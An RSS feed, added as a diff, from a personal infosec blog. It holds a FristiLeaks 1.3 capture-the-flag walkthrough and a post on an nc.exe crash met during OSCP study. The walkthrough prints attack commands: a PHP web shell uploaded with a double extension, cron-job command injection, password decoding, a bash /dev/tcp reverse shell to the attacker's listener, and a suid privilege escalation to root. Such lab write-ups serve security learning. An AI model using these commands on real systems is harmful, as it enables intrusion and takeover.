@@ -1,0 +1,160 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Python &#8211; Graeme Robinson&#039;s blog</title>
+	<atom:link href="/category/development/python/feed/" rel="self" type="application/rss+xml" />
+	<link>/</link>
+	<description>A place for my thoughts when I was starting to break into the information security feild</description>
+	<lastBuildDate>Sun, 22 Oct 2017 11:31:46 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=6.6.2</generator>
+	<item>
+		<title>FristiLeaks 1.3</title>
+		<link>/fristileaks-1-3/</link>
+					<comments>/fristileaks-1-3/#respond</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Sun, 22 Oct 2017 11:29:27 +0000</pubDate>
+				<category><![CDATA[Compromise]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[Passwords]]></category>
+		<category><![CDATA[Penetration Test]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Python]]></category>
+		<category><![CDATA[Shell]]></category>
+		<category><![CDATA[Unix]]></category>
+		<category><![CDATA[Web Server]]></category>
+		<guid isPermaLink="false">/?p=321</guid>
+
+					<description><![CDATA[Following on from my previous post about Kioptrix 2014, this post will be about how I got root on the next VM in the list, which is FristiLeaks 1.3 So the first thing I did after turning the VM on &#8230; <a href="/fristileaks-1-3/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>Following on from <a href="/kioptrix-2014/">my previous post about Kioptrix 2014</a>, this post will be about how I got root on the next VM in <a href="https://medium.com/@a.hilton83/oscp-training-vms-hosted-on-vulnhub-com-22fa061bf6a1">the list</a>, which is FristiLeaks 1.3</p>
+<p>So the first thing I did after turning the VM on was notice in the console that it displays it&#8217;s IP address so there is no need to run netdiscover. So lets start with nmap:</p>
+<pre>root@kali:~# nmap -A [IP-REDACTED]
+
+Starting Nmap 7.40 ( https://nmap.org/ ) at 2017-10-21 14:02 EDT
+Nmap scan report for [IP-REDACTED]
+Host is up (0.00035s latency).
+Not shown: 999 filtered ports
+PORT STATE SERVICE VERSION
+80/tcp open http Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)
+| http-methods: 
+|_ Potentially risky methods: TRACE
+| http-robots.txt: 3 disallowed entries 
+|_/cola /sisi /beer
+|_http-server-header: Apache/2.2.15 (CentOS) DAV/2 PHP/5.3.3
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+MAC Address: 08:00:27:A5:A6:76 (Oracle VirtualBox virtual NIC)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X|3.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
+OS details: Linux 2.6.32 - 3.10, Linux 2.6.32 - 3.13
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT ADDRESS
+1 0.35 ms [IP-REDACTED]
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds</pre>
+<p>Interesting results; port 80 is the only open port, and unsurprisingly it&#8217;s running a web server on that port. nmap has handily checked for a robots.txt on that system and found 3 directories listed (cola, sis, beer). Time to fire up a web browser and take a look.</p>
+<p>The index page is not that interesting, but in the source, it does suggest that I should be able to get root within four hours. It took me at least twice that! The three directories mentioned earlier all appear to server the same page with a single meme on suggesting I&#8217;m in the wrong place. Interestingly, the image is served from an &#8220;images&#8221; directory and when I go there, I am given a listing of the directory which appears to contain only this meme and the image used in the index page.</p>
+<p>At this point, I didn&#8217;t really know what I was supposed to do, but I tried going to the &#8220;fristi&#8221; directory and got lucky, because I was presented with an admin login page. If I hadn&#8217;t been so lucky, I would have used dirb, so I did this later with standard wordlists and it didn&#8217;t find anything. I then created a text file with all the words from both pages and both images and it then found the page.</p>
+<p>This admin page requires a username and password, and I don&#8217;t have either, though I could guess at passwords, and I did try things like &#8220;Nelson&#8221; (the Simpsons character in the image), but didn&#8217;t get anywhere. The source of the page has a comment from someone who calls themselves &#8220;eezeepz&#8221;. There is also a comment in the meta description that says that images are base64 encoded, and they&#8217;re right. The image of Nelson is base64 encoded, and there is also a comment below it that is base64 encoded data. That comment happens to be a base64 encoded png, the content of which is the letters &#8220;keKkeKKeKKeKkEkkEk&#8221; in comic-sans font. That looks like a password, and combined with the username &#8220;eezeepz&#8221;, I am able to log in.</p>
+<p>The page I am taken to after I log in is one where I can apparently upload a file. We know this web server runs php, so it makes sense to try to upload a php script, but when we try that it tells us that we can only upload png, jpg and gif files. I assume this is enforced by file extension rather than validating the content of the file. Most web servers will only execute files ending in .php, but a common misconfiguration is to make them execute files with .php anywhere in the name, so I called my file backdoor.php.png so I tried uploading my one line php shell with a png extension, which it appeared to accept and told me it had been placed in /uploads. Sure enough directing my web browser to http://[IP-REDACTED]/fristi/uploads/backdoor.php.png?e=whoami told me that I was able to execute commands as the user called apache.</p>
+<p>Viewing the /etc/passwd file showed me that there were some other users that look interesting (root, ezeepz, admin, fristi &amp; fristigod). and looking in the /var/www directory showed a notes.txt file that has a message from &#8220;jerry&#8221; to eezeepz telling them to clean their home directory, but not to &#8220;delete the important stuff&#8221;. I also noticed that I can list the contents of /home/eezeepz. In /home/eezeepz there is another notes.txt, this one is another message from &#8220;jerry&#8221; basically telling me how to run a select few commands under his account (admin). The message says to put commands in a file called /tmp/runthis and those commands will be run every minute with the results written to /tmp/cronresult.</p>
+<p>This command in my backdoor should tell me what is in the admin account</p>
+<pre>echo "ls ~" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>but unfortunately it only tells me that my command has to start with /home/admin or usr/bin. neither of these contain ls, but /home/admin contains grep, so I can try this:</p>
+<pre>echo "/home/admin/grep -c . ~/*" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>which should tell me which files are in admin&#8217;s home folder, and it does. Files of interest are cronjob.py, cryptedpass.txt cryptpass.py whoisyourgodnow.txt. I should be able to get the contents of cronjob.py by doing:</p>
+<pre>echo "/home/admin/grep . *.py *.txt" &gt;/tmp/runthis;sleep 60;cat /tmp/cronresult</pre>
+<p>The output from this shows me how the cronjob works. It looks like (due to a bug) it checks for &#8216;|&amp;;&#8217; instead of &#8216;|&#8217; <strong>or</strong> &#8216;&amp;&#8217; <strong>or</strong> &#8216;;&#8217; (they should probably have used the &#8220;any()&#8221; builtin) so I can get away with running any command as admin, as long as I prefix it with /home/admin/, (e.g. &#8220;/home/admin/echo a; ls ~&#8221; to list the content of /home/admin) and it also shows me two poorly &#8220;encrypted&#8221; passwords and a python script that was used to &#8220;encrypt&#8221; them.</p>
+<p>I can decrypt these passwords by creating a simple python script to reverse the steps done by the cryptpass.py script:</p>
+<pre>#decrypt.py
+import base64, codecs, sys
+def decodeString(str):
+    base64string= codecs.decode(str[::-1], 'rot13')
+    return base64.b64decode(base64string)
+cryptoresult=decodeString(sys.argv[1])
+print cryptoresult</pre>
+<p>When I run this with the encrypted password, I get &#8220;thisisalsopw123&#8221; from cryptedpass.txt, and &#8220;LetThereBeFristi!&#8221; from whoisyourgodnow.txt.</p>
+<p>Running these commands as admin one at a time through web server then waiting for the cron job to run is a bit slow. It&#8217;s time to figure out how to get a reverse shell, then we should be able to switch users using the su command. I know that there is no nc or ncat or netcat on this system because I ran &#8220;which nc nectar cat&#8221; as apache and was told it doesn&#8217;t exist. Bash does though, and using redirection to and from bash&#8217;s builtin /dev/tcp, I can get similar results to using nc and bash</p>
+<p>I started a netcat listener enemy attacking machine using &#8220;nc -vnlp 4444&#8221; then using my backdoor.php.png, I ran &#8220;bash -i &gt;/dev/tcp/[IP-REDACTED]/4444 0&gt;&amp;1 2&gt;&amp;1&#8221;. I had to made sure to url encode this one before I requested it with my web browser for some reason because it wouldn&#8217;t work otherwise.</p>
+<p>So now I have a shell as apache, but when I try to &#8220;su admin&#8221; it tells me that &#8220;standard in must be a tty&#8221;, and I am still the apache user. Luckily, I found a one line command that works around this and gives me a tty that I can run su in:</p>
+<pre>python -c 'import pty; pyt.spawn("/bin/bash")'</pre>
+<p>and I can use the passwords I decrypted earlier for the admin and the fristigod accounts.</p>
+<p>There isn&#8217;t much of interest in /home/frisitigod, but that&#8217;s not frisitigod&#8217;s home directory. The home dir is /var/fristigod and inside there is a hidden folder called .secret_admin_stuffand it contains one executable file called doCom, owned by root and with the suid bit set. Unfortunately running it tells me that I&#8217;m the wrong user.</p>
+<p>I got stuck at this point and tried various things like running the program as apache and as  admin and running as root using sudo using all the accounts I have access to. I tried running strings against the file to figure out if I could see a username or id, but I wasn&#8217;t able to. Running strings did tell me that the usage is &#8220;./program_name terminal_command&#8221; though, so it looks like it&#8217;s a way of running any command as root (obviously terribly insecure).</p>
+<p>Eventually I noticed in fristigod&#8217;s .bash_history file there was evidence that this program had been run by fristigod as the first user (using sudo -u, which I had to read up on because I didn&#8217;t know that was a thing!). So the following command confirmed that I was able to run commands as root:</p>
+<pre>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom id</pre>
+<p>running bash as root gives me a root shell. There is a txt file in /home/root that I can now read, which congratulates me and suggests that it should have taken me 4 hours (it took me much longer) and lastly has the flag.</p>
+<p>I really enjoyed this machine, especially as it didn&#8217;t have any known exploits to compile and or run. It was all just configuration mistakes and silly security mistakes. I also really enjoyed having to work around not being able to use nc on this system since it wasn&#8217;t present.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/fristileaks-1-3/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>nc.exe v1.10 NT crashes when -e used and </title>
+		<link>/nc-exe-v1-10-nt-crashes-when-e-used-and/</link>
+					<comments>/nc-exe-v1-10-nt-crashes-when-e-used-and/#respond</comments>
+		
+		<dc:creator><![CDATA[Graeme Robinson]]></dc:creator>
+		<pubDate>Mon, 07 Aug 2017 13:02:27 +0000</pubDate>
+				<category><![CDATA[Development]]></category>
+		<category><![CDATA[Information Security]]></category>
+		<category><![CDATA[Lesson Learned]]></category>
+		<category><![CDATA[Online Course]]></category>
+		<category><![CDATA[OSCP]]></category>
+		<category><![CDATA[Penetration Test]]></category>
+		<category><![CDATA[Python]]></category>
+		<guid isPermaLink="false">/?p=295</guid>
+
+					<description><![CDATA[I&#8217;m currently working through the PWK course from offensive-security, hoping to get my OSCP certification. While following the course materials, I&#8217;ve got to a section that talks about methods of transferring binary files after you have a shell on a &#8230; <a href="/nc-exe-v1-10-nt-crashes-when-e-used-and/">Continue reading <span class="meta-nav">&#8594;</span></a>]]></description>
+										<content:encoded><![CDATA[<p>I&#8217;m currently working through the PWK course from offensive-security, hoping to get my OSCP certification. While following the course materials, I&#8217;ve got to a section that talks about methods of transferring binary files after you have a shell on a remote system.</p>
+<p>One of the methods suggested is converting the file to text using exe2bat.exe to convert the file into a series of echo commands with redirection to a file that can be copy/pasted into the shell and finally running debug.exe to convert the file back into an exe. It&#8217;s a pretty well known method, detailed instructions can be found easily with google.</p>
+<p>I hit a problem when working through this though&#8230; I created a bind shell using nc.exe (v1.10 NT) and when i connected to this and pasted in the lines from the bat file created by exe2bat.exe, the nc.exe process would crash. It turned out to be crashing when it got the 3rd line from the bat file. I thought this was strange, so I contacted offensive-security support and they confirmed my findings, but weren&#8217;t sure why and suggested I used a different method to get a remote shell, e.g. using msfvenom.</p>
+<p>I have done some testing myself, and wrote a python script that tells me what it received and how long it was so that I could see in more detail what was going on. The script is:</p>
+<pre lang="PYTHON" line="1">#!/usr/bin/env python3
+
+import sys
+
+print('pypipe.py v0.1')
+print('--------------', flush=True)
+
+for idx, line in enumerate(sys.stdin):
+    line = line.strip()
+    print('# Received line {}. Length (bytes):{}'.format(
+            str(idx).zfill(3),
+            str(len(line)).zfill(3)),
+        flush=True)</pre>
+<p>Binding this to port 80 on windows with</p>
+<pre lang="BASH">nc -nvlp 80 -e "py pypipe.py"</pre>
+<p>and then connecting with netcat on my other system makes any input get reported back to the remote system line by line, and i can see that the problem happens when a long line is sent. I could also tell that it accepted a line with 323 characters, but when i sent 324, it crashed.</p>
+<p>I suspect I&#8217;m seeing the bug mentioned <a href="https://www.exploit-db.com/exploits/726/">here</a> and <a href="https://www.exploit-db.com/exploits/16436/">here</a>.</p>
+<p>So I&#8217;ve learned that I can&#8217;t use that version of nc.exe to send binary files that have been converted into long text strings. Different versions of nc probably don&#8217;t have this issue.</p>
+<p>While this is a problem because it&#8217;s an exploitable bug, this is not much of a problem for transferring binary files because in real world secenarios because there won&#8217;t be nc.exe on the system unless I&#8217;ve already found a way of getting a binary file onto the system, but it&#8217;s something that did trip me up for a few hours while doing the PWK course.</p>
+]]></content:encoded>
+					
+					<wfw:commentRss>/nc-exe-v1-10-nt-crashes-when-e-used-and/feed/</wfw:commentRss>
+			<slash:comments>0</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
